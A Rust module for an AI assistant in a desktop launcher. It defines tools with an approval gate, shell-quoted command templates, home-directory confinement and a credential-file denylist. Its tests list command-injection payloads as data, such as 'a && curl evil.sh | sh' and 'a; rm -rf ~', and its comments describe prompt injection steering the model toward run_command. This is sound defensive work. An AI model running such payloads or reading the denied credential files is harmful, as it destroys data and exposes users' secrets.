//! Tools the model can ask to run.
//!
//! Two kinds, split by what running them costs:
//!
//! * **Read-only** tools answer questions — search, read, list, calculate. They
//!   run automatically, on a worker thread, because they do real I/O and a slow
//!   mount must never freeze a `KeyboardMode::Exclusive` overlay.
//! * **Side-effecting** tools change something — open, launch, run. They always
//!   ask first, and then run on the main thread, because every one of them is a
//!   fire-and-forget spawn that returns immediately (and two of them need GTK,
//!   which is main-thread-only anyway).
//!
//! The split is what makes the approval gate cheap: there is no path by which a
//! side-effecting tool executes without the card having been shown.

pub mod schema;

use std::{fs, path::Path, path::PathBuf};

use crate::{
    config::{SpotlightAiConfig, SpotlightAiToolConfig, SpotlightAiToolParam},
    custom_actions::shell_quote,
    launcher::{fuzzy, spawn},
    spotlight::calc,
};

/// Cap on a file `read_file` will return. Beyond this the model gets a refusal
/// naming the size, which is more useful than a truncated file it might reason
/// about as though it were whole.
const MAX_READ_BYTES: u64 = 256 * 1024;
/// Cap on entries returned by `list_directory` and `search_files`.
const MAX_ENTRIES: usize = 200;
/// Bounds on the `search_files` walk, mirroring the `/` prefix's own walker.
const MAX_SEARCH_DEPTH: usize = 6;
const MAX_SEARCH_VISITS: usize = 20_000;

/// Whether running a tool changes anything.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum Effect {
    ReadOnly,
    SideEffecting,
}

/// What a tool actually does when run.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum ToolKind {
    SearchFiles,
    ListDirectory,
    ReadFile,
    Calculate,
    ListApps,
    OpenPath,
    LaunchApp,
    RunCommand,
    /// A user-defined command template.
    Custom {
        command: String,
        params: Vec<SpotlightAiToolParam>,
        /// `confirm = "never"` downgrades this to auto-run — the user's
        /// explicit, per-tool choice.
        always_confirm: bool,
    },
}

#[derive(Clone, Debug, PartialEq)]
pub struct ToolDef {
    pub name: String,
    pub description: String,
    pub schema: serde_json::Value,
    pub effect: Effect,
    pub kind: ToolKind,
}

impl ToolDef {
    /// Whether activating this tool must show the approval card first.
    ///
    /// Read-only tools never ask. Side-effecting ones always do, unless the user
    /// wrote `confirm = "never"` on that specific custom tool.
    pub fn needs_approval(&self) -> bool {
        match self.effect {
            Effect::ReadOnly => false,
            Effect::SideEffecting => match &self.kind {
                ToolKind::Custom { always_confirm, .. } => *always_confirm,
                _ => true,
            },
        }
    }

    /// The tool's declaration in Claude's wire format.
    pub fn api_declaration(&self) -> serde_json::Value {
        serde_json::json!({
            "name": self.name,
            "description": self.description,
            "input_schema": self.schema,
        })
    }
}

/// One call the model asked for.
#[derive(Clone, Debug, PartialEq)]
pub struct ToolCall {
    pub id: String,
    pub name: String,
    pub input: serde_json::Value,
}

/// The result of running one. Both variants become a `tool_result` — a failure
/// is reported back, never dropped, or the model waits forever for an answer.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum ToolOutcome {
    Ok(String),
    Error(String),
}

impl ToolOutcome {
    pub fn is_error(&self) -> bool {
        matches!(self, Self::Error(_))
    }

    pub fn text(&self) -> &str {
        match self {
            Self::Ok(text) | Self::Error(text) => text,
        }
    }
}

/// A flattened application entry, snapshotted on the main thread.
///
/// `AppIndex` is built from `gio::AppInfo`, which is main-thread-only, so the
/// list is copied to plain data before any worker can see it.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct AppSummary {
    pub desktop_id: String,
    pub name: String,
    pub description: Option<String>,
}

// -- the tool set ----------------------------------------------------------

fn builtin(
    name: &str,
    description: &str,
    schema: serde_json::Value,
    effect: Effect,
    kind: ToolKind,
) -> ToolDef {
    ToolDef {
        name: name.to_string(),
        description: description.to_string(),
        schema,
        effect,
        kind,
    }
}

fn object_schema(properties: serde_json::Value, required: &[&str]) -> serde_json::Value {
    serde_json::json!({
        "type": "object",
        "properties": properties,
        "required": required,
        "additionalProperties": false,
    })
}

/// Every tool a provider may use, given its configuration.
///
/// Order is stable — built-ins then custom, each in declaration order — because
/// the tool list renders at the very front of the prompt and any reordering
/// invalidates the whole prompt cache.
pub fn definitions(config: &SpotlightAiConfig) -> Vec<ToolDef> {
    let mut tools = Vec::new();

    if config.builtin_tools {
        tools.extend(read_only_builtins());
        tools.extend(side_effecting_builtins());

        // Deliberately last and separately gated: this is the tool a prompt
        // injection would aim for, so enabling the rest must not enable it.
        if config.run_command {
            tools.push(builtin(
                "run_command",
                "Run a shell command. Prefer a more specific tool when one fits.",
                object_schema(
                    serde_json::json!({
                        "command": { "type": "string", "description": "The shell command line" },
                    }),
                    &["command"],
                ),
                Effect::SideEffecting,
                ToolKind::RunCommand,
            ));
        }
    }

    for tool in &config.tools {
        if let Some(definition) = custom_tool(tool) {
            tools.push(definition);
        }
    }

    tools
}

fn read_only_builtins() -> Vec<ToolDef> {
    vec![
        builtin(
            "search_files",
            "Search the user's folders for files whose name matches a query.",
            object_schema(
                serde_json::json!({
                    "query": { "type": "string", "description": "Part of a file name" },
                }),
                &["query"],
            ),
            Effect::ReadOnly,
            ToolKind::SearchFiles,
        ),
        builtin(
            "list_directory",
            "List the entries of a directory.",
            object_schema(
                serde_json::json!({
                    "path": { "type": "string", "description": "Absolute path, or one starting with ~" },
                }),
                &["path"],
            ),
            Effect::ReadOnly,
            ToolKind::ListDirectory,
        ),
        builtin(
            "read_file",
            "Read a text file. Refuses credential files and anything outside the home directory.",
            object_schema(
                serde_json::json!({
                    "path": { "type": "string", "description": "Absolute path, or one starting with ~" },
                }),
                &["path"],
            ),
            Effect::ReadOnly,
            ToolKind::ReadFile,
        ),
        builtin(
            "calculate",
            "Evaluate an arithmetic expression.",
            object_schema(
                serde_json::json!({
                    "expression": { "type": "string", "description": "e.g. 2^10 or sqrt(2)" },
                }),
                &["expression"],
            ),
            Effect::ReadOnly,
            ToolKind::Calculate,
        ),
        builtin(
            "list_apps",
            "List the applications installed on this machine.",
            object_schema(
                serde_json::json!({
                    "query": { "type": "string", "description": "Optional filter" },
                }),
                &[],
            ),
            Effect::ReadOnly,
            ToolKind::ListApps,
        ),
    ]
}

fn side_effecting_builtins() -> Vec<ToolDef> {
    vec![
        builtin(
            "open_path",
            "Open a file or folder in the file manager.",
            object_schema(
                serde_json::json!({
                    "path": { "type": "string", "description": "Absolute path, or one starting with ~" },
                }),
                &["path"],
            ),
            Effect::SideEffecting,
            ToolKind::OpenPath,
        ),
        builtin(
            "launch_app",
            "Launch an installed application by its desktop id.",
            object_schema(
                serde_json::json!({
                    "desktop_id": { "type": "string", "description": "e.g. firefox.desktop" },
                }),
                &["desktop_id"],
            ),
            Effect::SideEffecting,
            ToolKind::LaunchApp,
        ),
    ]
}

fn custom_tool(config: &SpotlightAiToolConfig) -> Option<ToolDef> {
    let name = config.name.trim();
    let command = config.command.trim();

    // The name reaches the API as a tool identifier, so it has to look like one.
    if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        tracing::warn!(
            tool = config.name,
            "ignoring an AI tool with an unusable name"
        );
        return None;
    }
    if command.is_empty() {
        tracing::warn!(tool = name, "ignoring an AI tool with no command");
        return None;
    }

    Some(ToolDef {
        name: name.to_string(),
        description: match config.description.trim() {
            "" => format!("Run the {name} command"),
            description => description.to_string(),
        },
        schema: schema::build(&config.params),
        effect: Effect::SideEffecting,
        kind: ToolKind::Custom {
            command: command.to_string(),
            params: config.params.clone(),
            always_confirm: config.confirm == crate::config::AiToolConfirm::Always,
        },
    })
}

/// The server-side tools Anthropic runs on our behalf.
///
/// Declared, never executed here — there is no client loop and no approval gate,
/// because nothing runs on this machine. Deliberately does **not** also declare
/// `code_execution`: these versions have dynamic filtering built in, and a
/// second execution environment confuses the model.
pub fn server_side_declarations() -> Vec<serde_json::Value> {
    vec![
        serde_json::json!({ "type": "web_search_20260209", "name": "web_search" }),
        serde_json::json!({ "type": "web_fetch_20260209", "name": "web_fetch" }),
    ]
}

// -- substitution ----------------------------------------------------------

/// Expands a custom tool's command template against the model's arguments.
///
/// **Every value is shell-quoted.** The arguments are model output, and a model
/// that has just read a file or a web page can be steered by its contents — so
/// this is the boundary that has to hold even when the model is compromised.
///
/// Substitution is a single left-to-right pass, never a sequence of `replace`
/// calls: a value that happens to contain `{other}` must be data, not a
/// placeholder for the next parameter to expand into.
pub fn expand_command(
    template: &str,
    params: &[SpotlightAiToolParam],
    input: &serde_json::Value,
) -> Result<String, String> {
    let mut values = Vec::new();
    for param in params {
        let raw = input.get(&param.name);
        let text = match raw.and_then(scalar) {
            Some(text) => text,
            None => {
                if param.required {
                    return Err(format!("missing required parameter '{}'", param.name));
                }
                String::new()
            }
        };
        values.push((param.name.as_str(), shell_quote(&text)));
    }

    Ok(expand(template, &values))
}

/// A declared parameter's value as text. Objects and arrays are not declarable,
/// so they are refused rather than serialized into a command line.
fn scalar(value: &serde_json::Value) -> Option<String> {
    match value {
        serde_json::Value::String(text) => Some(text.clone()),
        serde_json::Value::Number(number) => Some(number.to_string()),
        serde_json::Value::Bool(flag) => Some(flag.to_string()),
        _ => None,
    }
}

fn expand(template: &str, values: &[(&str, String)]) -> String {
    let mut out = String::with_capacity(template.len());
    let mut rest = template;

    while let Some(start) = rest.find('{') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];

        let Some(end) = after.find('}') else {
            // An unclosed brace is literal text, not a broken placeholder.
            out.push_str(&rest[start..]);
            return out;
        };

        let name = &after[..end];
        match values.iter().find(|(key, _)| *key == name) {
            Some((_, value)) => out.push_str(value),
            // Not a declared parameter — leave it exactly as written.
            None => {
                out.push('{');
                out.push_str(name);
                out.push('}');
            }
        }
        rest = &after[end + 1..];
    }

    out.push_str(rest);
    out
}

/// The command line an approval card should show: what will actually run.
pub fn preview(definition: &ToolDef, call: &ToolCall) -> String {
    match &definition.kind {
        ToolKind::Custom {
            command, params, ..
        } => expand_command(command, params, &call.input)
            .unwrap_or_else(|error| format!("(cannot expand: {error})")),
        ToolKind::RunCommand => string_arg(&call.input, "command").unwrap_or_default(),
        ToolKind::OpenPath => format!(
            "open {}",
            string_arg(&call.input, "path").unwrap_or_default()
        ),
        ToolKind::LaunchApp => format!(
            "launch {}",
            string_arg(&call.input, "desktop_id").unwrap_or_default()
        ),
        _ => call.input.to_string(),
    }
}

fn string_arg(input: &serde_json::Value, key: &str) -> Option<String> {
    input
        .get(key)
        .and_then(serde_json::Value::as_str)
        .map(str::to_string)
}

// -- read-only execution (worker thread) -----------------------------------

/// Runs a read-only tool. Blocking — worker threads only.
pub fn run_read_only(
    kind: &ToolKind,
    input: &serde_json::Value,
    apps: &[AppSummary],
) -> ToolOutcome {
    match kind {
        ToolKind::Calculate => match string_arg(input, "expression") {
            Some(expression) => match calc::eval(&expression) {
                Ok(value) => ToolOutcome::Ok(calc::format_result(value)),
                Err(error) => ToolOutcome::Error(error.to_string()),
            },
            None => ToolOutcome::Error("expression is required".to_string()),
        },
        ToolKind::ListApps => ToolOutcome::Ok(list_apps(input, apps)),
        ToolKind::ListDirectory => match resolve(input, "path") {
            Ok(path) => list_directory(&path),
            Err(error) => ToolOutcome::Error(error),
        },
        ToolKind::ReadFile => match resolve(input, "path") {
            Ok(path) => read_file(&path),
            Err(error) => ToolOutcome::Error(error),
        },
        ToolKind::SearchFiles => match string_arg(input, "query") {
            Some(query) => search_files(&query),
            None => ToolOutcome::Error("query is required".to_string()),
        },
        _ => ToolOutcome::Error("not a read-only tool".to_string()),
    }
}

fn list_apps(input: &serde_json::Value, apps: &[AppSummary]) -> String {
    let query = string_arg(input, "query").unwrap_or_default();

    let mut lines = Vec::new();
    for app in apps {
        if !query.trim().is_empty()
            && fuzzy::match_fields(
                &query,
                &[
                    fuzzy::Field::new(app.name.as_str(), 100),
                    fuzzy::Field::new(app.desktop_id.as_str(), 60),
                ],
            )
            .is_none()
        {
            continue;
        }
        lines.push(match &app.description {
            Some(description) => format!("{} ({}) — {description}", app.name, app.desktop_id),
            None => format!("{} ({})", app.name, app.desktop_id),
        });
        if lines.len() >= MAX_ENTRIES {
            break;
        }
    }

    match lines.is_empty() {
        true => "No matching applications.".to_string(),
        false => lines.join("\n"),
    }
}

fn list_directory(path: &Path) -> ToolOutcome {
    let entries = match fs::read_dir(path) {
        Ok(entries) => entries,
        Err(error) => {
            return ToolOutcome::Error(format!("cannot list {}: {error}", path.display()));
        }
    };

    let mut lines = Vec::new();
    for entry in entries.flatten().take(MAX_ENTRIES) {
        let suffix = match entry.file_type() {
            Ok(kind) if kind.is_dir() => "/",
            _ => "",
        };
        lines.push(format!("{}{suffix}", entry.file_name().to_string_lossy()));
    }
    lines.sort();

    match lines.is_empty() {
        true => ToolOutcome::Ok(format!("{} is empty.", path.display())),
        false => ToolOutcome::Ok(lines.join("\n")),
    }
}

fn read_file(path: &Path) -> ToolOutcome {
    if let Some(reason) = refuse_reason(path) {
        return ToolOutcome::Error(reason);
    }

    match fs::metadata(path) {
        Ok(metadata) if metadata.len() > MAX_READ_BYTES => {
            return ToolOutcome::Error(format!(
                "{} is {} bytes, over the {MAX_READ_BYTES}-byte limit",
                path.display(),
                metadata.len()
            ));
        }
        Ok(metadata) if !metadata.is_file() => {
            return ToolOutcome::Error(format!("{} is not a file", path.display()));
        }
        Err(error) => {
            return ToolOutcome::Error(format!("cannot read {}: {error}", path.display()));
        }
        Ok(_) => {}
    }

    match fs::read_to_string(path) {
        Ok(text) => ToolOutcome::Ok(text),
        Err(error) => ToolOutcome::Error(format!("cannot read {}: {error}", path.display())),
    }
}

fn search_files(query: &str) -> ToolOutcome {
    let Some(home) = home_dir() else {
        return ToolOutcome::Error("no home directory".to_string());
    };

    let mut hits: Vec<(i32, PathBuf)> = Vec::new();
    let mut queue = vec![(home, 0usize)];
    let mut visited = 0usize;

    while let Some((directory, depth)) = queue.pop() {
        if depth > MAX_SEARCH_DEPTH || visited >= MAX_SEARCH_VISITS {
            continue;
        }
        let Ok(entries) = fs::read_dir(&directory) else {
            continue;
        };

        for entry in entries.flatten() {
            visited += 1;
            if visited >= MAX_SEARCH_VISITS {
                break;
            }

            let name = entry.file_name().to_string_lossy().to_string();
            // Dot-directories are almost never what was meant and are where the
            // credential stores live.
            if name.starts_with('.') {
                continue;
            }

            let is_dir = entry.file_type().map(|kind| kind.is_dir()).unwrap_or(false);
            if is_dir {
                queue.push((entry.path(), depth + 1));
                continue;
            }
            if let Some(found) =
                fuzzy::match_fields(query, &[fuzzy::Field::new(name.as_str(), 100)])
            {
                hits.push((found.score, entry.path()));
            }
        }
    }

    hits.sort_by(|left, right| right.0.cmp(&left.0));
    hits.truncate(MAX_ENTRIES);

    match hits.is_empty() {
        true => ToolOutcome::Ok(format!("No files matching '{query}'.")),
        false => ToolOutcome::Ok(
            hits.iter()
                .map(|(_, path)| path.display().to_string())
                .collect::<Vec<_>>()
                .join("\n"),
        ),
    }
}

// -- side-effecting execution (main thread, post-approval) -----------------

/// Runs a side-effecting tool. Every one of these is a fire-and-forget spawn
/// that returns immediately, so it is safe on the main loop — and two of them
/// need GTK, which is main-thread-only.
pub fn run_side_effecting(
    kind: &ToolKind,
    input: &serde_json::Value,
    expanded: &str,
) -> ToolOutcome {
    match kind {
        ToolKind::OpenPath => match resolve(input, "path") {
            Ok(path) => match spawn::launch_in_ioexplorer(&path) {
                Ok(()) => ToolOutcome::Ok(format!("Opened {}", path.display())),
                Err(error) => ToolOutcome::Error(format!("cannot open: {error}")),
            },
            Err(error) => ToolOutcome::Error(error),
        },
        ToolKind::LaunchApp => match string_arg(input, "desktop_id") {
            Some(id) => match crate::launcher::app_index::launch_desktop_id(&id) {
                Ok(()) => ToolOutcome::Ok(format!("Launched {id}")),
                Err(error) => ToolOutcome::Error(error),
            },
            None => ToolOutcome::Error("desktop_id is required".to_string()),
        },
        ToolKind::RunCommand | ToolKind::Custom { .. } => {
            if expanded.trim().is_empty() {
                return ToolOutcome::Error("nothing to run".to_string());
            }
            match spawn::spawn_shell_line(expanded, "ioexplorer-spotlight") {
                Ok(()) => ToolOutcome::Ok(format!("Started: {expanded}")),
                Err(error) => ToolOutcome::Error(format!("cannot run: {error}")),
            }
        }
        _ => ToolOutcome::Error("not a side-effecting tool".to_string()),
    }
}

// -- background execution --------------------------------------------------

/// One finished read-only tool run.
#[derive(Clone, Debug)]
pub struct ToolEvent {
    pub generation: u64,
    pub id: String,
    pub outcome: ToolOutcome,
}

/// Runs read-only tools off the main thread.
///
/// Same idiom as every other background source here — `std::thread` + `mpsc`,
/// drained from the GTK tick, with a generation counter standing in for
/// cancellation. A `read_file` on a stalled network mount would otherwise
/// freeze an overlay the user cannot even Escape out of.
pub struct ToolRunner {
    generation: std::sync::Arc<std::sync::atomic::AtomicU64>,
    sender: std::sync::mpsc::Sender<ToolEvent>,
    receiver: std::sync::mpsc::Receiver<ToolEvent>,
}

impl ToolRunner {
    pub fn new() -> Self {
        let (sender, receiver) = std::sync::mpsc::channel();
        Self {
            generation: std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)),
            sender,
            receiver,
        }
    }

    /// Invalidates any in-flight run without starting a new one.
    pub fn cancel(&self) {
        self.generation
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn start(
        &self,
        id: String,
        kind: ToolKind,
        input: serde_json::Value,
        apps: Vec<AppSummary>,
    ) {
        let generation = self
            .generation
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed)
            + 1;

        let sender = self.sender.clone();
        let counter = std::sync::Arc::clone(&self.generation);
        std::thread::spawn(move || {
            let outcome = run_read_only(&kind, &input, &apps);
            if counter.load(std::sync::atomic::Ordering::Relaxed) == generation {
                let _ = sender.send(ToolEvent {
                    generation,
                    id,
                    outcome,
                });
            }
        });
    }

    /// Collects results that are still current, discarding superseded ones.
    pub fn drain(&self) -> Vec<ToolEvent> {
        let current = self.generation.load(std::sync::atomic::Ordering::Relaxed);
        let mut events = Vec::new();
        while let Ok(event) = self.receiver.try_recv() {
            if event.generation == current {
                events.push(event);
            }
        }
        events
    }
}

impl Default for ToolRunner {
    fn default() -> Self {
        Self::new()
    }
}

// -- path safety -----------------------------------------------------------

fn home_dir() -> Option<PathBuf> {
    directories::UserDirs::new().map(|dirs| dirs.home_dir().to_path_buf())
}

/// Turns a model-supplied path argument into a real one, or explains why not.
fn resolve(input: &serde_json::Value, key: &str) -> Result<PathBuf, String> {
    let raw = string_arg(input, key).ok_or_else(|| format!("{key} is required"))?;
    let expanded = crate::spotlight::paths::expand_tilde(raw.trim());

    // Canonicalise before judging it: `~/Documents/../.ssh/id_rsa` is inside the
    // home directory by prefix and outside it by intent, and only the resolved
    // path tells the two apart. This also resolves symlinks, so a link planted
    // inside the home directory cannot point out of it.
    let path = expanded
        .canonicalize()
        .map_err(|error| format!("cannot resolve {}: {error}", expanded.display()))?;

    let home = home_dir().ok_or_else(|| "no home directory".to_string())?;
    if !path.starts_with(&home) {
        return Err(format!("{} is outside the home directory", path.display()));
    }

    Ok(path)
}

/// Directory and file names that hold credentials.
///
/// A denylist is a weak control on its own — this is the second layer, after
/// [`resolve`] has already confined the path to the home directory. It exists
/// because the most valuable thing on a developer's machine sits in a
/// predictable set of dotfiles, including this application's own API key.
const DENIED_COMPONENTS: [&str; 10] = [
    ".ssh",
    ".gnupg",
    ".aws",
    ".kube",
    ".docker",
    ".password-store",
    ".mozilla",
    ".pki",
    "keyrings",
    "ioexplorer",
];

const DENIED_SUFFIXES: [&str; 6] = [".pem", ".key", ".p12", ".pfx", "_rsa", "_ed25519"];

fn refuse_reason(path: &Path) -> Option<String> {
    for component in path.components() {
        let name = component.as_os_str().to_string_lossy().to_lowercase();
        if DENIED_COMPONENTS.contains(&name.as_str()) {
            return Some(format!("{} is a credential location", path.display()));
        }
        // `.env`, `.env.local`, `.envrc` — secrets by convention.
        if name == ".env" || name.starts_with(".env.") || name == ".envrc" {
            return Some(format!("{} holds environment secrets", path.display()));
        }
        if name.ends_with("_history") || name == ".netrc" {
            return Some(format!("{} is a credential location", path.display()));
        }
    }

    let name = path
        .file_name()
        .map(|name| name.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    if DENIED_SUFFIXES.iter().any(|suffix| name.ends_with(suffix)) {
        return Some(format!("{} looks like a private key", path.display()));
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{AiParamType, AiToolConfirm};

    fn param(name: &str, required: bool) -> SpotlightAiToolParam {
        SpotlightAiToolParam {
            name: name.to_string(),
            kind: AiParamType::String,
            description: None,
            required,
        }
    }

    fn params(names: &[&str]) -> Vec<SpotlightAiToolParam> {
        names.iter().map(|name| param(name, false)).collect()
    }

    // -- substitution safety ------------------------------------------------

    /// The security-critical test. Arguments are model output, and a model that
    /// has read an attacker-controlled file can be steered by its contents.
    #[test]
    fn a_param_can_never_break_out_of_the_command() {
        for payload in [
            "a; rm -rf ~",
            "a && curl evil.sh | sh",
            "$(id)",
            "`id`",
            "a | tee /tmp/x",
            "a\nrm -rf ~",
            "'; rm -rf ~; '",
            "a > /etc/passwd",
        ] {
            let line = expand_command(
                "play {query}",
                &params(&["query"]),
                &serde_json::json!({ "query": payload }),
            )
            .expect("expands");

            // Everything after the program name is one quoted argument.
            assert_eq!(
                line,
                format!("play {}", shell_quote(payload)),
                "payload escaped: {payload}"
            );
            // A single quote is the only character that can end the quoting, and
            // it must always arrive as the closing-reopening dance.
            assert!(
                !line[5..].contains("';") || payload.contains("';"),
                "unbalanced quoting for {payload}"
            );
        }
    }

    /// A value containing another parameter's placeholder must stay data. A
    /// sequence of `replace` calls would expand it on the next parameter's pass.
    #[test]
    fn a_value_containing_a_placeholder_is_not_re_expanded() {
        let line = expand_command(
            "run {first} {second}",
            &params(&["first", "second"]),
            &serde_json::json!({ "first": "{second}", "second": "payload" }),
        )
        .expect("expands");

        assert_eq!(line, "run '{second}' 'payload'");
    }

    #[test]
    fn an_undeclared_placeholder_is_left_alone() {
        let line = expand_command(
            "run {query} {undeclared}",
            &params(&["query"]),
            &serde_json::json!({ "query": "x", "undeclared": "should not appear" }),
        )
        .expect("expands");

        assert_eq!(line, "run 'x' {undeclared}");
    }

    /// An object or array cannot be shell-quoted meaningfully, and no declarable
    /// type produces one — so it is refused rather than serialized.
    #[test]
    fn non_scalar_arguments_are_refused() {
        assert!(scalar(&serde_json::json!({ "a": 1 })).is_none());
        assert!(scalar(&serde_json::json!([1, 2])).is_none());
        assert_eq!(scalar(&serde_json::json!(3)), Some("3".to_string()));
        assert_eq!(scalar(&serde_json::json!(true)), Some("true".to_string()));
    }

    #[test]
    fn a_missing_required_param_is_an_error_not_an_empty_string() {
        let error = expand_command(
            "play {query}",
            &[param("query", true)],
            &serde_json::json!({}),
        )
        .expect_err("must refuse");

        assert!(error.contains("query"), "{error}");
    }

    #[test]
    fn a_missing_optional_param_expands_to_an_empty_argument() {
        assert_eq!(
            expand_command("play {query}", &params(&["query"]), &serde_json::json!({}))
                .expect("expands"),
            "play ''"
        );
    }

    #[test]
    fn an_unclosed_brace_is_literal_text() {
        assert_eq!(
            expand_command("run {query", &params(&["query"]), &serde_json::json!({}))
                .expect("expands"),
            "run {query"
        );
    }

    // -- approval gating ----------------------------------------------------

    #[test]
    fn read_only_tools_never_ask_and_side_effecting_ones_always_do() {
        let config = SpotlightAiConfig {
            builtin_tools: true,
            run_command: true,
            ..base_config()
        };

        for tool in definitions(&config) {
            match tool.effect {
                Effect::ReadOnly => assert!(!tool.needs_approval(), "{} asked", tool.name),
                Effect::SideEffecting => {
                    assert!(tool.needs_approval(), "{} did not ask", tool.name)
                }
            }
        }
    }

    #[test]
    fn confirm_never_downgrades_a_custom_tool_to_auto_run() {
        let always = custom_tool(&SpotlightAiToolConfig {
            name: "play_music".to_string(),
            description: String::new(),
            command: "playerctl {query}".to_string(),
            confirm: AiToolConfirm::Always,
            params: params(&["query"]),
        })
        .expect("valid tool");
        let never = custom_tool(&SpotlightAiToolConfig {
            confirm: AiToolConfirm::Never,
            ..SpotlightAiToolConfig {
                name: "play_music".to_string(),
                description: String::new(),
                command: "playerctl {query}".to_string(),
                confirm: AiToolConfirm::Always,
                params: params(&["query"]),
            }
        })
        .expect("valid tool");

        assert!(always.needs_approval());
        assert!(!never.needs_approval());
        // Both are still side-effecting — the effect is a fact about the tool,
        // the gate is the user's choice about it.
        assert_eq!(never.effect, Effect::SideEffecting);
    }

    // -- the tool set -------------------------------------------------------

    #[test]
    fn tools_are_off_until_enabled() {
        assert!(definitions(&base_config()).is_empty());
    }

    /// Enabling the ordinary built-ins must not enable the one that can run
    /// anything — that is the whole point of gating it separately.
    #[test]
    fn run_command_stays_off_when_the_other_builtins_are_on() {
        let config = SpotlightAiConfig {
            builtin_tools: true,
            ..base_config()
        };

        let names = definitions(&config)
            .into_iter()
            .map(|tool| tool.name)
            .collect::<Vec<_>>();
        assert!(!names.contains(&"run_command".to_string()), "{names:?}");
        assert!(names.contains(&"search_files".to_string()));

        let enabled = SpotlightAiConfig {
            run_command: true,
            ..config
        };
        assert!(
            definitions(&enabled)
                .iter()
                .any(|tool| tool.name == "run_command")
        );
    }

    #[test]
    fn a_custom_tool_with_an_unusable_name_or_no_command_is_dropped() {
        for (name, command) in [("", "echo"), ("bad name", "echo"), ("ok", "  ")] {
            assert!(
                custom_tool(&SpotlightAiToolConfig {
                    name: name.to_string(),
                    description: String::new(),
                    command: command.to_string(),
                    confirm: AiToolConfirm::Always,
                    params: Vec::new(),
                })
                .is_none(),
                "{name:?}/{command:?} should be dropped"
            );
        }
    }

    /// Tool declarations render at the very front of the prompt, so a reordering
    /// invalidates the entire prompt cache for every conversation.
    #[test]
    fn the_tool_order_is_stable() {
        let config = SpotlightAiConfig {
            builtin_tools: true,
            run_command: true,
            tools: vec![SpotlightAiToolConfig {
                name: "play_music".to_string(),
                description: String::new(),
                command: "playerctl {query}".to_string(),
                confirm: AiToolConfirm::Always,
                params: params(&["query"]),
            }],
            ..base_config()
        };

        let names = |config: &SpotlightAiConfig| {
            definitions(config)
                .into_iter()
                .map(|tool| tool.name)
                .collect::<Vec<_>>()
        };
        assert_eq!(names(&config), names(&config));
        assert_eq!(
            names(&config),
            vec![
                "search_files",
                "list_directory",
                "read_file",
                "calculate",
                "list_apps",
                "open_path",
                "launch_app",
                "run_command",
                "play_music",
            ]
        );
    }

    /// A second execution environment confuses the model, and these tool
    /// versions already have dynamic filtering built in.
    #[test]
    fn server_side_tools_do_not_declare_code_execution() {
        let declared = server_side_declarations();
        let types = declared
            .iter()
            .map(|tool| tool["type"].as_str().unwrap_or_default().to_string())
            .collect::<Vec<_>>();

        assert_eq!(types, vec!["web_search_20260209", "web_fetch_20260209"]);
        assert!(!types.iter().any(|kind| kind.starts_with("code_execution")));
    }

    // -- read_file confinement ---------------------------------------------

    #[test]
    fn credential_paths_are_refused() {
        for path in [
            "/home/u/.ssh/id_rsa",
            "/home/u/.aws/credentials",
            "/home/u/project/.env",
            "/home/u/project/.env.local",
            "/home/u/.gnupg/secring.gpg",
            "/home/u/.config/ioexplorer/anthropic-key",
            "/home/u/.bash_history",
            "/home/u/.netrc",
            "/home/u/certs/server.pem",
            "/home/u/keys/deploy_ed25519",
        ] {
            assert!(
                refuse_reason(Path::new(path)).is_some(),
                "{path} must be refused"
            );
        }
    }

    #[test]
    fn ordinary_files_are_not_refused() {
        for path in [
            "/home/u/Documents/notes.md",
            "/home/u/src/main.rs",
            "/home/u/environment.txt",
        ] {
            assert_eq!(refuse_reason(Path::new(path)), None, "{path}");
        }
    }

    /// `..` inside an otherwise-innocent path is exactly how a traversal reads,
    /// which is why the check runs on the canonical form.
    #[test]
    fn traversal_is_resolved_before_the_home_check() {
        let temp = tempfile::tempdir().expect("temp dir");
        let outside = temp.path().join("outside.txt");
        fs::write(&outside, "secret").expect("write");

        let escaping = serde_json::json!({
            "path": format!("{}/../{}", temp.path().display(),
                            outside.file_name().unwrap().to_string_lossy()),
        });

        // The temp dir is not under $HOME, so this is refused on the home check
        // — and the point is that it is judged on the *resolved* path.
        let error = resolve(&escaping, "path").expect_err("must refuse");
        assert!(
            error.contains("outside the home directory") || error.contains("cannot resolve"),
            "{error}"
        );
    }

    #[test]
    fn a_path_that_does_not_exist_is_refused_rather_than_guessed() {
        let error = resolve(&serde_json::json!({ "path": "/nonexistent/nope" }), "path")
            .expect_err("must refuse");
        assert!(error.contains("cannot resolve"), "{error}");
    }

    // -- previews -----------------------------------------------------------

    /// The approval card must show what will actually run, not the template.
    #[test]
    fn the_preview_is_the_expanded_command() {
        let tool = custom_tool(&SpotlightAiToolConfig {
            name: "play_music".to_string(),
            description: String::new(),
            command: "playerctl-search {query}".to_string(),
            confirm: AiToolConfirm::Always,
            params: params(&["query"]),
        })
        .expect("valid tool");

        let call = ToolCall {
            id: "toolu_1".to_string(),
            name: "play_music".to_string(),
            input: serde_json::json!({ "query": "miles davis" }),
        };

        assert_eq!(preview(&tool, &call), "playerctl-search 'miles davis'");
    }

    pub(super) fn base_config() -> SpotlightAiConfig {
        SpotlightAiConfig {
            enabled: true,
            prefix: "ai".to_string(),
            provider: "claude".to_string(),
            model: None,
            label: None,
            icon: None,
            endpoint: None,
            api_key_env: None,
            api_key_file: None,
            max_tokens: 8192,
            effort: crate::config::AiEffort::Low,
            default: false,
            builtin_tools: false,
            run_command: false,
            web_search: false,
            tools: Vec::new(),
        }
    }
}
